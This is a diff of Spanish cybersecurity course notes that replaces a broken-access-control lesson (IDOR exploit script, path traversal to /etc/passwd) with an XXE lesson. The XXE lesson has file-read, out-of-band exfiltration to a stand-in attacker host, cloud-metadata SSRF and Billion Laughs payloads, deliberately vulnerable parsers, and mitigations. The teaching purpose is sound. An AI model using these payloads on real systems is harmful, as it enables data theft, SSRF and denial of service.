@@ -1,4 +1,4 @@
-# Clase 20: Control de Acceso Roto
+# Clase 20: XXE - XML External Entities
 
 **Duracion:** 2 horas
 
@@ -6,811 +6,604 @@
 
 ## Objetivos de Aprendizaje
 
-1. Diferenciar claramente entre autenticacion y autorizacion
-2. Identificar y explotar vulnerabilidades IDOR (Insecure Direct Object Reference)
-3. Comprender Path Traversal y como prevenirlo
-4. Implementar RBAC (Role-Based Access Control) correctamente
-5. Aplicar el principio de minimo privilegio
+1. Comprender la estructura de XML, DTD y entidades XML
+2. Identificar y explotar vulnerabilidades XXE en aplicaciones web
+3. Diferenciar entre In-band XXE, Blind XXE y Error-based XXE
+4. Implementar mitigaciones efectivas usando parseadores seguros
 
 ---
 
 ## Contenido Detallado
 
-### 1. Autenticacion vs. Autorizacion
+### 1. Que es XML?
 
-| Concepto | Definicion | Ejemplo |
-|----------|-----------|---------|
-| **Autenticacion** | Verificar la identidad del usuario (quien eres) | Login con usuario/contrasena, biometria, 2FA |
-| **Autorizacion** | Verificar que el usuario tiene permiso para hacer algo (que puedes hacer) | El usuario admin puede borrar, el viewer solo puede leer |
+XML (eXtensible Markup Language) es un lenguaje de marcado que define reglas para codificar documentos en formato legible por humanos y maquinas.
 
-**Frase clave:** La autenticacion falla cuando alguien que no es quien dice ser accede; la autorizacion falla cuando alguien legitimo accede a lo que no deberia.
+#### Estructura Basica de XML
 
-### 2. IDOR (Insecure Direct Object Reference)
-
-IDOR ocurre cuando una aplicacion expone referencias directas a objetos internos (IDs, nombres de archivo, claves) y no verifica que el usuario tenga permiso para acceder a ese objeto.
-
-**Ejemplo clasico:**
-
-```python
-# VULNERABLE: Sin verificacion de pertenencia
-@app.route('/api/factura/<int:factura_id>')
-def ver_factura(factura_id):
-    factura = database.get_factura(factura_id)
-    return jsonify(factura)
-    # Cualquier usuario autenticado puede cambiar factura_id y ver facturas ajenas
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<usuarios>
+    <usuario id="1">
+        <nombre>Juan Perez</nombre>
+        <email>juan@example.com</email>
+        <rol>admin</rol>
+    </usuario>
+    <usuario id="2">
+        <nombre>Maria Garcia</nombre>
+        <email>maria@example.com</email>
+        <rol>user</rol>
+    </usuario>
+</usuarios>
 ```
 
-**Ataque:** El atacante cambia `?id=123` a `?id=124` y accede a datos de otro usuario.
+#### DTD (Document Type Definition)
 
-### 3. Elevacion de Privilegios
+Un DTD define la estructura legal de un documento XML. Se declara dentro del documento o externamente.
 
-Ocurre cuando un usuario obtiene permisos que no le corresponden.
-
-**Vertical:** Usuario normal obtiene privilegios de admin (ej: modificar rol en la request).
-
-**Horizontal:** Usuario normal accede a datos de otro usuario del mismo nivel.
-
-**Ejemplo de elevacion vertical:**
-
-```python
-# VULNERABLE: El rol viene del cliente
-@app.route('/api/admin/delete', methods=['POST'])
-def delete_user():
-    user_role = request.json.get('role')  # El cliente envia 'admin'
-    if user_role == 'admin':
-        # Ejecutar accion administrativa
-        pass
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE usuarios [
+    <!ELEMENT usuarios (usuario+)>
+    <!ELEMENT usuario (nombre, email, rol)>
+    <!ATTLIST usuario id CDATA #REQUIRED>
+    <!ELEMENT nombre (#PCDATA)>
+    <!ELEMENT email (#PCDATA)>
+    <!ELEMENT rol (#PCDATA)>
+]>
+<usuarios>
+    <usuario id="1">
+        <nombre>Juan</nombre>
+        <email>juan@test.com</email>
+        <rol>admin</rol>
+    </usuario>
+</usuarios>
 ```
 
-### 4. Path Traversal
+#### Entidades XML
 
-Path traversal permite al atacante leer archivos fuera del directorio permitido usando `../`.
+Las entidades son variables que representan datos. Pueden ser internas, externas o predefinidas.
 
-**Ejemplo vulnerable:**
+**Entidades predefinidas:**
+- `&lt;` = <
+- `&gt;` = >
+- `&amp;` = &
+- `&apos;` = '
+- `&quot;` = "
 
-```python
-@app.route('/api/files/<filename>')
-def get_file(filename):
-    # VULNERABLE: El atacante puede pasar ../../etc/passwd
-    with open(f'/var/app/files/{filename}', 'r') as f:
-        return f.read()
+**Entidades internas (definidas en el DTD):**
+```xml
+<!DOCTYPE foo [
+    <!ENTITY nombre "Juan Perez">
+]>
+<datos>&nombre;</datos>
 ```
 
-**Ataque:** `GET /api/files/../../../windows/system32/config/sam`
-
-### 5. RBAC (Role-Based Access Control)
-
-RBAC asigna permisos basados en roles. Una implementacion incorrecta es la causa #1 de broken access control.
-
-**Estructura basica de RBAC:**
-
-```
-USUARIOS → ROLES → PERMISOS
-                ↓
-           Acciones permitidas
+**Entidades externas (la clave del ataque XXE):**
+```xml
+<!DOCTYPE foo [
+    <!ENTITY ext SYSTEM "file:///c:/windows/win.ini">
+]>
+<datos>&ext;</datos>
 ```
 
-**Modelo de datos:**
+### 2. Ataque XXE (XML External Entity)
 
-```python
-# Definicion de roles y permisos
-ROLES = {
-    'admin': ['crear', 'leer', 'actualizar', 'eliminar', 'gestionar_usuarios'],
-    'user': ['crear', 'leer', 'actualizar'],  # Solo sus propios recursos
-    'viewer': ['leer'],  # Solo lectura
-}
+XXE ocurre cuando un parser XML procesa entidades externas de fuentes no confiables, permitiendo al atacante leer archivos del servidor, hacer SSRF o causar DoS.
+
+#### Impacto de XXE
+
+| Impacto | Descripcion |
+|---------|------------|
+| **Lectura de archivos** | Leer /etc/passwd, archivos de configuracion, codigo fuente |
+| **SSRF** | Hacer peticiones HTTP a sistemas internos (nube, bases de datos) |
+| **DoS (Billion Laughs)** | Expandir entidades recursivas hasta agotar memoria |
+| **RCE** | En casos especificos con PHP expect module o protocolos especiales |
+
+#### Variantes de XXE
+
+**In-band XXE:** El resultado se devuelve directamente en la respuesta del servidor.
+
+**Blind XXE:** No se ve el resultado directamente. Se usa out-of-band (OOB) mediante DNS/HTTP.
+
+**Error-based XXE:** Se induce un error que revela el contenido del archivo en el mensaje de error.
+
+### 3. In-band XXE - Lectura de Archivos
+
+```xml
+<!-- Payload para leer /etc/passwd (o c:/windows/win.ini en Windows) -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>
+    <nombre>&xxe;</nombre>
+</root>
 ```
 
-### 6. Principio de Minimo Privilegio
+### 4. Blind XXE con Exfiltracion Out-of-Band
 
-Cada usuario/proceso debe tener exactamente los permisos necesarios para realizar su funcion, ni mas ni menos.
+```xml
+<!-- Payload para exfiltrar datos via HTTP a servidor del atacante -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://atacante.com/?data=%file;'>">
+    %eval;
+    %exfil;
+]>
+```
 
-**Aplicacion practica:**
-- Un viewer no necesita permiso de eliminacion
-- Un trabajo batch que solo lee no necesita permisos de escritura
-- Un proceso que sirve archivos no necesita ejecutar comandos del sistema
-- Los contenedores deben correr como non-root
+### 5. XXE a SSRF (Server-Side Request Forgery)
 
-### 7. OWASP Top 10 - Broken Access Control
+```xml
+<!-- Payload para acceder a servicios internos -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>
+    <datos>&xxe;</datos>
+</root>
+```
 
-Desde 2021, Broken Access Control es la categoria #1 del OWASP Top 10.
+### 6. Billion Laughs Attack (DoS)
 
-**Estadisticas:**
-- 94% de las aplicaciones probadas tienen algun tipo de broken access control
-- La tasa de incidencia promedio es 3.81%
-- Mas de 318,000 ocurrencias de CVEs relacionados
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+    <!ENTITY lol "lol">
+    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<root>&lol5;</root>
+<!-- Se expande exponencialmente: ~3GB de memoria -->
+```
 
----
-
-## Ejercicio 1: Explotar y Corregir IDOR en Flask
-
-### Escenario
-
-Una aplicacion de notas permite a los usuarios ver sus notas por ID. El sistema tiene IDOR porque no verifica que la nota pertenezca al usuario.
-
-**Paso 1: Aplicacion vulnerable**
+### 7. Codigo Vulnerable en Python
 
 ```python
 """
-app_idor.py - Aplicacion con IDOR
+vulnerable_xml_parser.py - App vulnerable a XXE
 """
-from flask import Flask, jsonify, request, session
-import uuid
+from flask import Flask, request, jsonify
+import xml.etree.ElementTree as ET
 
 app = Flask(__name__)
-app.secret_key = 'supersecretkey'
 
-# Base de datos simulada
-notas_db = {}
-usuarios_db = {
-    'alice': {'password': 'pass123', 'id': 1},
-    'bob': {'password': 'pass456', 'id': 2},
-}
-
-# Crear notas de ejemplo
-notas_db[1] = [
-    {'id': 101, 'titulo': 'Nota secreta de Alice', 'contenido': 'Mi contrasena es alice123'},
-    {'id': 102, 'titulo': 'Lista de compras', 'contenido': 'Leche, pan, huevos'},
-]
-notas_db[2] = [
-    {'id': 201, 'titulo': 'Nota de Bob', 'contenido': 'Deberia 1000USD a alguien'},
-    {'id': 202, 'titulo': 'Ideas de proyecto', 'contenido': 'App de ciberseguridad'},
-]
-
-@app.route('/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    username = data.get('username')
-    password = data.get('password')
-
-    if username in usuarios_db and usuarios_db[username]['password'] == password:
-        session['user_id'] = usuarios_db[username]['id']
-        session['username'] = username
-        return jsonify({'mensaje': 'Login exitoso', 'usuario': username})
-    return jsonify({'error': 'Credenciales invalidas'}), 401
-
-@app.route('/api/notas', methods=['GET'])
-def listar_notas():
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
-    user_id = session['user_id']
-    notas = notas_db.get(user_id, [])
-    return jsonify(notas)
-
-@app.route('/api/notas/<int:nota_id>')
-def ver_nota(nota_id):
-    if 'user_id' not in session:
-        return jsonify({'error': 'No autenticado'}), 401
-
-    # VULNERABLE: Busca la nota por ID sin verificar pertenencia
-    for uid, notas in notas_db.items():
-        for nota in notas:
-            if nota['id'] == nota_id:
-                return jsonify(nota)
-
-    return jsonify({'error': 'Nota no encontrada'}), 404
-
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000, debug=False)
-```
-
-**Paso 2: Script de explotacion**
-
-```python
-"""
-exploit_idor.py - Explotacion de IDOR
-"""
-import requests
-
-BASE = "http://127.0.0.1:5000"
-
-# 1. Login como Alice
-session = requests.Session()
-login_data = {'username': 'alice', 'password': 'pass123'}
-r = session.post(f"{BASE}/login", json=login_data)
-print(f"Login como Alice: {r.json()}")
-
-# 2. Listar notas de Alice (deberia ver solo las suyas)
-r = session.get(f"{BASE}/api/notas")
-print(f"Notas de Alice: {r.json()}")
-
-# 3. IDOR: Intentar ver nota de Bob (ID 201)
-r = session.get(f"{BASE}/api/notas/201")
-print(f"IDOR - Nota de Bob vista por Alice: {r.json()}")
-```
-
-**Paso 3: Version corregida (verificando pertenencia)**
-
-```python
-"""
-app_idor_segura.py - Version corregida con control de acceso
-"""
-from flask import Flask, jsonify, request, session
-import uuid
-
-app = Flask(__name__)
-app.secret_key = 'supersecretkey'
-
-# Base de datos simulada - cada nota registra su dueno
-notas_db = {}
-usuarios_db = {
-    'alice': {'password': 'pass123', 'id': 1},
-    'bob': {'password': 'pass456', 'id': 2},
-}
-
-# Las notas ahora incluyen user_id
-notas_db[1] = [
-    {'id': 101, 'user_id': 1, 'titulo': 'Nota secreta de Alice', 'contenido': 'Mi contrasena es alice123'},
-    {'id': 102, 'user_id': 1, 'titulo': 'Lista de compras', 'contenido': 'Leche, pan, huevos'},
-]
-notas_db[2] = [
-    {'id': 201, 'user_id': 2, 'titulo': 'Nota de Bob', 'contenido': 'Deberia 1000USD a alguien'},
-    {'id': 202, 'user_id': 2, 'titulo': 'Ideas de proyecto', 'contenido': 'App de ciberseguridad'},
-]
-
-def login_required(f):
-    """Decorador para verificar autenticacion"""
-    def wrapper(*args, **kwargs):
-        if 'user_id' not in session:
-            return jsonify({'error': 'No autenticado'}), 401
-        return f(*args, **kwargs)
-    wrapper.__name__ = f.__name__
-    return wrapper
-
-@app.route('/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    username = data.get('username')
-    password = data.get('password')
-
-    if username in usuarios_db and usuarios_db[username]['password'] == password:
-        session['user_id'] = usuarios_db[username]['id']
-        session['username'] = username
-        return jsonify({'mensaje': 'Login exitoso', 'usuario': username})
-    return jsonify({'error': 'Credenciales invalidas'}), 401
-
-@app.route('/logout', methods=['POST'])
-def logout():
-    session.clear()
-    return jsonify({'mensaje': 'Sesion cerrada'})
-
-@app.route('/api/notas', methods=['GET'])
-@login_required
-def listar_notas():
-    user_id = session['user_id']
-    notas = notas_db.get(user_id, [])
-    return jsonify(notas)
-
-@app.route('/api/notas/<int:nota_id>', methods=['GET'])
-@login_required
-def ver_nota(nota_id):
-    user_id = session['user_id']
-
-    # CORREGIDO: Verificar que la nota pertenece al usuario
-    notas = notas_db.get(user_id, [])
-    for nota in notas:
-        if nota['id'] == nota_id:
-            return jsonify(nota)
-
-    return jsonify({'error': 'Nota no encontrada o acceso denegado'}), 404
-
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000, debug=False)
-```
-
-**Paso 4: Verificar la correccion**
-
-```python
-"""
-test_idor_seguro.py - Verificar que la correccion funciona
-"""
-import requests
-
-BASE = "http://127.0.0.1:5000"
-
-session = requests.Session()
-
-# Login como Alice
-session.post(f"{BASE}/login", json={'username': 'alice', 'password': 'pass123'})
-
-# Intentar ver nota de Bob
-r = session.get(f"{BASE}/api/notas/201")
-print(f"Intento de IDOR bloqueado: {r.json()}")
-# Debe devolver: {'error': 'Nota no encontrada o acceso denegado'} con 404
-
-# Ver nota propia
-r = session.get(f"{BASE}/api/notas/101")
-print(f"Nota propia accesible: {r.json()}")
-```
-
----
-
-## Ejercicio 2: Implementar RBAC en una API REST con 3 Roles
-
-### Escenario
-
-Implementar un sistema RBAC completo con 3 roles (admin, user, viewer) para una API REST de gestion de documentos.
-
-```python
-"""
-rbac_api.py - API REST con RBAC completo
-"""
-from flask import Flask, jsonify, request, session, abort
-from functools import wraps
-import os
-
-app = Flask(__name__)
-app.secret_key = os.urandom(32).hex()
-
-# ============================================================
-# CONFIGURACION RBAC
-# ============================================================
-
-# Definicion de permisos
-PERMISOS = {
-    'admin': [
-        'documentos:crear', 'documentos:leer', 'documentos:actualizar',
-        'documentos:eliminar', 'documentos:listar', 'usuarios:gestionar',
-        'reportes:generar', 'configuracion:editar'
-    ],
-    'user': [
-        'documentos:crear', 'documentos:leer', 'documentos:actualizar',
-        'documentos:listar'
-        # Sin eliminar, sin gestion de usuarios
-    ],
-    'viewer': [
-        'documentos:leer', 'documentos:listar'
-        # Solo lectura
-    ],
-}
-
-# Base de datos de usuarios
-USUARIOS = {
-    1: {'username': 'admin', 'password': 'admin123', 'role': 'admin'},
-    2: {'username': 'juan', 'password': 'user123', 'role': 'user'},
-    3: {'username': 'invitado', 'password': 'view123', 'role': 'viewer'},
-}
-
-# Base de datos de documentos (simulada)
-DOCUMENTOS = {
-    1: {'titulo': 'Plan de seguridad', 'contenido': 'Contenido confidencial...', 'owner_id': 1},
-    2: {'titulo': 'Reporte mensual', 'contenido': 'Datos del mes...', 'owner_id': 2},
-    3: {'titulo': 'Manual de usuario', 'contenido': 'Instrucciones...', 'owner_id': 2},
-}
-
-next_doc_id = 4
-
-# ============================================================
-# DECORADORES DE SEGURIDAD
-# ============================================================
-
-def requiere_permiso(permiso):
-    """Decorador que verifica que el usuario tenga un permiso especifico"""
-    def decorator(f):
-        @wraps(f)
-        def wrapper(*args, **kwargs):
-            if 'user_id' not in session:
-                return jsonify({'error': 'No autenticado'}), 401
-
-            user_id = session['user_id']
-            if user_id not in USUARIOS:
-                session.clear()
-                return jsonify({'error': 'Usuario no valido'}), 401
-
-            user_role = USUARIOS[user_id]['role']
-            user_permisos = PERMISOS.get(user_role, [])
-
-            if permiso not in user_permisos:
-                return jsonify({
-                    'error': 'Permiso denegado',
-                    'detalle': f'Se requiere permiso: {permiso}, rol actual: {user_role}'
-                }), 403
-
-            return f(*args, **kwargs)
-        return wrapper
-    return decorator
-
-def requiere_pertenencia_o_admin(f):
-    """Decorador que verifica que el recurso pertenezca al usuario o sea admin"""
-    @wraps(f)
-    def wrapper(doc_id, *args, **kwargs):
-        if 'user_id' not in session:
-            return jsonify({'error': 'No autenticado'}), 401
-
-        user_id = session['user_id']
-        user_role = USUARIOS[user_id]['role']
-
-        if doc_id not in DOCUMENTOS:
-            return jsonify({'error': 'Documento no encontrado'}), 404
-
-        # Admin puede acceder a todo
-        if user_role == 'admin':
-            return f(doc_id, *args, **kwargs)
-
-        # User/viewer solo a sus propios documentos
-        if DOCUMENTOS[doc_id]['owner_id'] != user_id:
-            return jsonify({'error': 'No tienes permiso para acceder a este documento'}), 403
-
-        return f(doc_id, *args, **kwargs)
-    return wrapper
-
-# ============================================================
-# RUTAS DE AUTENTICACION
-# ============================================================
-
-@app.route('/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    username = data.get('username', '')
-    password = data.get('password', '')
-
-    for uid, u in USUARIOS.items():
-        if u['username'] == username and u['password'] == password:
-            session['user_id'] = uid
-            session['username'] = username
-            session['role'] = u['role']
-            return jsonify({
-                'mensaje': 'Login exitoso',
-                'usuario': username,
-                'rol': u['role'],
-                'permisos': PERMISOS[u['role']]
-            })
-
-    return jsonify({'error': 'Credenciales invalidas'}), 401
-
-@app.route('/logout', methods=['POST'])
-def logout():
-    session.clear()
-    return jsonify({'mensaje': 'Sesion cerrada'})
-
-# ============================================================
-# RUTAS DE DOCUMENTOS CON RBAC
-# ============================================================
-
-@app.route('/api/documentos', methods=['GET'])
-@requiere_permiso('documentos:listar')
-def listar_documentos():
-    user_id = session['user_id']
-    user_role = USUARIOS[user_id]['role']
-
-    if user_role == 'admin':
-        # Admin ve todos
-        docs = [{'id': k, 'titulo': v['titulo'], 'owner_id': v['owner_id']}
-                for k, v in DOCUMENTOS.items()]
-    else:
-        # User/viewer solo ven los suyos
-        docs = [{'id': k, 'titulo': v['titulo'], 'owner_id': v['owner_id']}
-                for k, v in DOCUMENTOS.items() if v['owner_id'] == user_id]
-
-    return jsonify(docs)
-
-@app.route('/api/documentos/<int:doc_id>', methods=['GET'])
-@requiere_permiso('documentos:leer')
-@requiere_pertenencia_o_admin
-def obtener_documento(doc_id):
-    doc = DOCUMENTOS[doc_id]
-    return jsonify(doc)
-
-@app.route('/api/documentos', methods=['POST'])
-@requiere_permiso('documentos:crear')
-def crear_documento():
-    global next_doc_id
-    data = request.get_json()
-    user_id = session['user_id']
-
-    nuevo_doc = {
-        'id': next_doc_id,
-        'titulo': data.get('titulo', 'Sin titulo'),
-        'contenido': data.get('contenido', ''),
-        'owner_id': user_id,
-    }
-    DOCUMENTOS[next_doc_id] = nuevo_doc
-    next_doc_id += 1
-
-    return jsonify(nuevo_doc), 201
-
-@app.route('/api/documentos/<int:doc_id>', methods=['PUT'])
-@requiere_permiso('documentos:actualizar')
-@requiere_pertenencia_o_admin
-def actualizar_documento(doc_id):
-    data = request.get_json()
-    if 'titulo' in data:
-        DOCUMENTOS[doc_id]['titulo'] = data['titulo']
-    if 'contenido' in data:
-        DOCUMENTOS[doc_id]['contenido'] = data['contenido']
-    return jsonify(DOCUMENTOS[doc_id])
-
-@app.route('/api/documentos/<int:doc_id>', methods=['DELETE'])
-@requiere_permiso('documentos:eliminar')
-@requiere_pertenencia_o_admin
-def eliminar_documento(doc_id):
-    doc = DOCUMENTOS.pop(doc_id)
-    return jsonify({'mensaje': f'Documento {doc_id} eliminado'})
-
-@app.route('/api/usuarios', methods=['GET'])
-@requiere_permiso('usuarios:gestionar')
-def listar_usuarios():
-    # Solo admin puede listar usuarios
-    return jsonify([
-        {'id': uid, 'username': u['username'], 'role': u['role']}
-        for uid, u in USUARIOS.items()
-    ])
-
-@app.route('/api/configuracion', methods=['GET', 'PUT'])
-@requiere_permiso('configuracion:editar')
-def configuracion():
-    # Solo admin puede ver/editar configuracion
-    return jsonify({'mensaje': 'Configuracion del sistema', 'admin_only': True})
-
-# ============================================================
-# PRUEBAS
-# ============================================================
-
-def run_tests():
-    """Pruebas automatizadas para verificar RBAC"""
-    import requests
-
-    base = "http://127.0.0.1:5000"
-    test_session = requests.Session()
-
-    def print_test(name, result, expected=True):
-        status = "PASS" if result == expected else "FAIL"
-        print(f"[{status}] {name}")
-
-    # Test 1: Login como viewer
-    r = test_session.post(f"{base}/login", json={'username': 'invitado', 'password': 'view123'})
-    print_test("Login viewer", r.status_code == 200)
-    data = r.json()
-    print(f"  Rol: {data['rol']}, Permisos: {data['permisos']}")
-
-    # Test 2: Viewer intenta crear documento (debe fallar)
-    r = test_session.post(f"{base}/api/documentos", json={'titulo': 'Test', 'contenido': 'test'})
-    print_test("Viewer no puede crear documentos", r.status_code == 403)
-
-    # Test 3: Viewer puede leer documentos
-    r = test_session.get(f"{base}/api/documentos")
-    print_test("Viewer puede listar documentos", r.status_code == 200)
-
-    # Test 4: Login como user
-    r = test_session.post(f"{base}/login", json={'username': 'juan', 'password': 'user123'})
-    print_test("Login user", r.status_code == 200)
-
-    # Test 5: User crea documento
-    r = test_session.post(f"{base}/api/documentos", json={'titulo': 'Mi documento', 'contenido': 'Secreto'})
-    print_test("User crea documento", r.status_code == 201)
-
-    # Test 6: User intenta eliminar (debe fallar)
-    r = test_session.delete(f"{base}/api/documentos/1")
-    print_test("User no puede eliminar documentos", r.status_code == 403)
-
-    # Test 7: Login como admin
-    r = test_session.post(f"{base}/login", json={'username': 'admin', 'password': 'admin123'})
-    print_test("Login admin", r.status_code == 200)
-
-    # Test 8: Admin puede eliminar cualquier documento
-    r = test_session.delete(f"{base}/api/documentos/1")
-    print_test("Admin puede eliminar cualquier documento", r.status_code == 200)
-
-    # Test 9: Admin puede gestionar usuarios
-    r = test_session.get(f"{base}/api/usuarios")
-    print_test("Admin lista usuarios", r.status_code == 200)
-    print(f"  Usuarios: {r.json()}")
-
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000, debug=False)
-```
-
-**Ejecutar pruebas:**
-
-```bash
-# Terminal 1: Iniciar servidor
-python rbac_api.py
-
-# Terminal 2: Ejecutar pruebas
-# Descomentar run_tests() al final del archivo y ejecutar:
-python -c "from rbac_api import *; run_tests()"
-```
-
----
-
-## Ejercicio 3: Path Traversal - Version Vulnerable y Segura
-
-### Escenario
-
-Un endpoint sirve archivos de usuario. La version vulnerable permite path traversal.
-
-**Version vulnerable:**
-
-```python
-"""
-path_traversal_vulnerable.py
-"""
-from flask import Flask, send_file, request, jsonify
-import os
-
-app = Flask(__name__)
-BASE_DIR = os.path.join(os.getcwd(), 'user_files')
-
-@app.route('/api/files/<path:filename>')
-def get_file(filename):
-    # VULNERABLE: filename puede contener ../ para escapar del directorio
-    filepath = os.path.join(BASE_DIR, filename)
-    print(f"Intentando leer: {filepath}")
-    try:
-        return send_file(filepath)
-    except FileNotFoundError:
-        return jsonify({'error': 'Archivo no encontrado'}), 404
-```
-
-**Ataque:** `GET /api/files/../../../etc/passwd`
-
-**Version corregida con path validation:**
-
-```python
-"""
-path_traversal_seguro.py
-"""
-from flask import Flask, send_file, request, jsonify, abort
-import os
-
-app = Flask(__name__)
-BASE_DIR = os.path.abspath(os.path.join(os.getcwd(), 'user_files'))
-
-# Asegurar que el directorio base existe
-os.makedirs(BASE_DIR, exist_ok=True)
-
-def safe_path(base_dir, filename):
-    """
-    Valida y retorna un path seguro dentro de base_dir.
-    Previene path traversal resolviendo el path absoluto
-    y verificando que este dentro del directorio permitido.
-    """
-    # 1. Resolver el path absoluto
-    absolute_path = os.path.abspath(os.path.join(base_dir, filename))
-
-    # 2. Verificar que el path resuelto este dentro del directorio base
-    if not absolute_path.startswith(base_dir + os.sep):
-        return None
-
-    # 3. Verificar que el archivo exista
-    if not os.path.isfile(absolute_path):
-        return None
-
-    return absolute_path
-
-@app.route('/api/files/<path:filename>')
-def get_file(filename):
-    filepath = safe_path(BASE_DIR, filename)
-
-    if filepath is None:
-        return jsonify({'error': 'Archivo no encontrado o acceso denegado'}), 404
+@app.route('/api/xml', methods=['POST'])
+def parse_xml():
+    xml_data = request.data
 
     try:
-        return send_file(filepath)
+        root = ET.fromstring(xml_data)
+        # Extraer contenido de la etiqueta <nombre>
+        nombre = root.find('nombre').text if root.find('nombre') is not None else ''
+        return jsonify({'nombre': nombre, 'status': 'ok'})
     except Exception as e:
-        return jsonify({'error': f'Error al leer archivo: {str(e)}'}), 500
+        return jsonify({'error': str(e)}), 400
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
+```
+
+**Problema:** `xml.etree.ElementTree` tiene DTD habilitado por defecto y procesa entidades externas.
+
+### 8. Codigo Vulnerable en Java
+
+```java
+// XMLParserServlet.java - vulnerable
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import org.w3c.dom.Document;
+import java.io.StringReader;
+import javax.xml.parsers.*;
+import org.xml.sax.InputSource;
+
+public class XMLParserServlet {
+    public String parseXml(String xmlString) throws Exception {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+        DocumentBuilder builder = factory.newDocumentBuilder();
+        Document doc = builder.parse(new InputSource(new StringReader(xmlString)));
+        return doc.getDocumentElement().getTextContent();
+    }
+}
+```
+
+### 9. Mitigaciones
+
+#### Deshabilitar DTD y Entidades Externas en Python
+
+```python
+from defusedxml import ElementTree as safe_ET
+
+# defusedxml es un wrapper seguro que bloquea XXE
+root = safe_ET.fromstring(xml_data)  # Levanta excepcion si hay XXE
+```
+
+#### Deshabilitar DTD y Entidades Externas en Java
+
+```java
+public class SafeXMLParser {
+    public static Document parse(String xml) throws Exception {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+
+        // Deshabilitar DTD completamente
+        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+        // Alternativa: deshabilitar solo entidades externas
+        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+        // Deshabilitar carga de DTD externo
+        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+
+        // Deshabilitar XInclude
+        factory.setXIncludeAware(false);
+        factory.setExpandEntityReferences(false);
+
+        DocumentBuilder builder = factory.newDocumentBuilder();
+        return builder.parse(new InputSource(new StringReader(xml)));
+    }
+}
+```
+
+#### Resumen de Mitigaciones
+
+| Medida | Descripcion |
+|--------|------------|
+| Deshabilitar DTD | `disallow-doctype-decl: true` (Java), usar `defusedxml` (Python) |
+| Deshabilitar entidades externas | `external-general-entities: false`, `external-parameter-entities: false` |
+| Usar formatos alternativos | JSON en vez de XML cuando sea posible |
+| Validar contenido | Whitelist de caracteres permitidos |
+| Actualizar librerias | Versiones recientes tienen configuraciones mas seguras |
+| WAF/Input validation | Filtrar keywords como `<!ENTITY`, `SYSTEM`, `PUBLIC` |
+
+---
+
+## Ejercicio 1: Explotar y Mitigar XXE en Python
+
+### Escenario
+
+Tienes una aplicacion Flask que parsea XML. Debes explotar la vulnerabilidad XXE para leer un archivo local y luego corregirla usando `defusedxml`.
+
+**Paso 1: Crear el servidor vulnerable**
+
+```python
+"""
+server_vulnerable.py - Servidor vulnerable a XXE
+"""
+from flask import Flask, request, jsonify
+import xml.etree.ElementTree as ET
+
+app = Flask(__name__)
 
 @app.route('/api/upload', methods=['POST'])
-def upload_file():
-    """Ejemplo de subida segura de archivos"""
-    if 'file' not in request.files:
-        return jsonify({'error': 'No se envio archivo'}), 400
-
-    file = request.files['file']
-
-    # 1. Validar nombre de archivo (evitar path traversal en el nombre)
-    filename = os.path.basename(file.filename)  # Solo el nombre base, sin directorios
-    if not filename:
-        return jsonify({'error': 'Nombre de archivo invalido'}), 400
-
-    # 2. Validar extension (opcional, depende del caso)
-    allowed_extensions = {'.txt', '.pdf', '.jpg', '.png', '.docx'}
-    ext = os.path.splitext(filename)[1].lower()
-    if ext not in allowed_extensions:
-        return jsonify({'error': f'Extension {ext} no permitida'}), 400
-
-    # 3. Generar nombre unico para prevenir colisiones
-    import uuid
-    unique_name = f"{uuid.uuid4().hex}{ext}"
-    save_path = os.path.join(BASE_DIR, unique_name)
-
-    # 4. Guardar archivo
-    file.save(save_path)
-
-    return jsonify({
-        'mensaje': 'Archivo subido exitosamente',
-        'filename': unique_name,
-        'url': f'/api/files/{unique_name}'
-    })
-
-# ============================================================
-# PRUEBAS
-# ============================================================
-
-def test_security():
-    """Pruebas de seguridad contra path traversal"""
-    import requests
-
-    base = "http://127.0.0.1:5000"
-
-    # Prueba 1: Path traversal simple
-    r = requests.get(f"{base}/api/files/../../../etc/passwd")
-    print(f"Path traversal simple: {r.status_code} - {r.json()}")
-
-    # Prueba 2: Path traversal con encoding
-    r = requests.get(f"{base}/api/files/..%2f..%2f..%2fetc%2fpasswd")
-    print(f"Path traversal encoded: {r.status_code} - {r.json()}")
-
-    # Prueba 3: Path traversal con doble encoding
-    r = requests.get(f"{base}/api/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
-    print(f"Path traversal double encoded: {r.status_code} - {r.json()}")
-
-    # Prueba 4: Path traversal con backslash (Windows)
